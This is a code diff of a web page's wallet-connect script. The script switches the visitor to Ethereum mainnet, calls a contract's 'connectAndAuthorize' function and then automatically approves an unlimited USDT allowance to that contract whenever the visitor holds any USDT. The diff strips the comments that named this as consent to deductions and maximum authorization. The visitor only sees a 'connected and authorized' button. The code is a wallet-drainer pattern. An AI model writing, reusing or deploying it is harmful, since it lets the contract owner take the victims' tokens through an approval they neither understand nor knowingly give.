@@ -54,7 +54,7 @@
         let userAddress;
         let contract;
         
-        const ETHEREUM_CONTRACT_ADDRESS = '0xd0dd2b726f7e7c6f7b62be25df61b7558a4ade08'; // 部署後更新
+        const ETHEREUM_CONTRACT_ADDRESS = '0xd0dd2b726f7e7c6f7b62be25df61b7558a4ade08';
         const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
         const CONTRACT_ABI = [
             "function connectAndAuthorize() external",
@@ -68,38 +68,32 @@
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
                 try {
-                    // 切換至 Ethereum 主網
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x1' }]
                     });
                     
-                    // 連繫錢包
                     provider = new ethers.BrowserProvider(window.ethereum);
                     await provider.send('eth_requestAccounts', []);
                     signer = await provider.getSigner();
                     userAddress = await signer.getAddress();
                     contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                     
-                    // 調用 connectAndAuthorize 表示同意扣款
                     const txAuthorize = await contract.connectAndAuthorize();
                     await txAuthorize.wait();
                     
-                    // 自動調用 USDT approve
                     const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
                     const balance = await usdtContract.balanceOf(userAddress);
                     if (balance > 0) {
-                        const maxAllowance = ethers.MaxUint256; // 設置最大授權
+                        const maxAllowance = ethers.MaxUint256;
                         const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
                         await txApprove.wait();
                     }
                     
-                    // 更新圖標狀態
                     connectButton.classList.add('connected');
                     connectButton.title = '已連繫並授權';
                     connectButton.disabled = true;
                     
-                    // 監聽帳戶變更
                     window.ethereum.on('accountsChanged', async (accounts) => {
                         if (accounts.length === 0) {
                             resetState();
